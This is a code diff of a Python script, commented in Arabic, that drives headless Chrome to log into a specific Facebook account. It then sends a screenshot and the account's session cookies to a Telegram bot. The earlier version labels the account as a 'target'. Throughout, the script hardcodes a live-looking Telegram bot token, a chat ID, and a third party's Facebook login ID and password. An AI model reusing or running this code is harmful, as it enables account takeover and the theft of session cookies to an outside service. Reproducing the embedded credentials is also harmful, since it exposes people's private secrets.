@@ -1,21 +1,18 @@
 import telebot
 import time
 import json
+import os
 from selenium import webdriver
 from selenium.webdriver.chrome.options import Options
 from selenium.webdriver.common.by import By
 
-# إعداداتك الخاصة
+# الإعدادات
 TOKEN = "7665591962:AAFIIe-izSG4rd71Kruf0xmXM9j11IYdHvc"
 CHAT_ID = "5653032481"
 bot = telebot.TeleBot(TOKEN)
 
-# بيانات الحساب المطلوبة
-TARGET_ID = "61583389620613"
-TARGET_PASS = "jasser vodka"
-
-def single_login():
-    print(f"🚀 محاولة الدخول للحساب: {TARGET_ID}")
+def login_check():
+    bot.send_message(CHAT_ID, "🚀 السكربت بدأ المحاولة الآن على حسابك...")
     
     opts = Options()
     opts.add_argument("--headless")
@@ -26,40 +23,42 @@ def single_login():
     driver = webdriver.Chrome(options=opts)
     try:
         driver.get("https://m.facebook.com/login/")
-        time.sleep(4)
+        time.sleep(5)
         
-        # إدخال البيانات
-        driver.find_element(By.NAME, "email").send_keys(TARGET_ID)
-        driver.find_element(By.NAME, "pass").send_keys(TARGET_PASS)
+        # كتابة البيانات
+        driver.find_element(By.NAME, "email").send_keys("61583389620613")
+        driver.find_element(By.NAME, "pass").send_keys("jasser vodka")
         
-        # الضغط على زر الدخول
+        bot.send_message(CHAT_ID, "📝 تم إدخال البيانات.. جاري الضغط على زر الدخول.")
+        
         try:
             driver.find_element(By.NAME, "login").click()
         except:
             driver.execute_script("document.querySelector('button[name=\"login\"]').click();")
             
-        time.sleep(10) # انتظار التحميل وفحص الحماية
+        time.sleep(10)
         
+        # التقاط صورة للشاشة لمعرفة ماذا حدث
+        driver.save_screenshot("result.png")
+        with open("result.png", "rb") as photo:
+            bot.send_photo(CHAT_ID, photo, caption="📸 صورة للحالة الحالية بعد محاولة الدخول")
+        
+        # فحص الكوكيز
         cookies = driver.get_cookies()
         if any(c['name'] == 'c_user' for c in cookies):
-            msg = f"✅ نجح الدخول للحساب!\n🆔: {TARGET_ID}\n🔑: {TARGET_PASS}"
-            bot.send_message(CHAT_ID, msg)
-            
-            # حفظ وإرسال الكوكيز
-            cookie_path = "target_cookies.json"
-            with open(cookie_path, "w") as f:
+            bot.send_message(CHAT_ID, "✅ مبروك! دخل الحساب بنجاح وسحبت الكوكيز.")
+            with open("cookies.json", "w") as f:
                 json.dump(cookies, f)
-            with open(cookie_path, "rb") as f:
-                bot.send_document(CHAT_ID, f, caption="🍪 كوكيز الحساب المطلوب")
-            print("Done! Check Telegram.")
+            with open("cookies.json", "rb") as f:
+                bot.send_document(CHAT_ID, f)
         else:
-            print("❌ فشل الدخول أو الحساب يحتاج تأكيد (Checkpoint).")
-            bot.send_message(CHAT_ID, f"⚠️ فشل الدخول للحساب {TARGET_ID}.\nقد يكون الرقم سري خاطئ أو الحساب محمي.")
+            bot.send_message(CHAT_ID, "❌ لم يتم الدخول مباشرة.. شوف الصورة (ممكن طلب كود أو كلمة سر غلط).")
             
     except Exception as e:
-        print(f"Error: {e}")
+        bot.send_message(CHAT_ID, f"⚠️ حدث خطأ تقني: {str(e)}")
     finally:
         driver.quit()
+        if os.path.exists("result.png"): os.remove("result.png")
 
 if __name__ == "__main__":
-    single_login()
+    login_check()
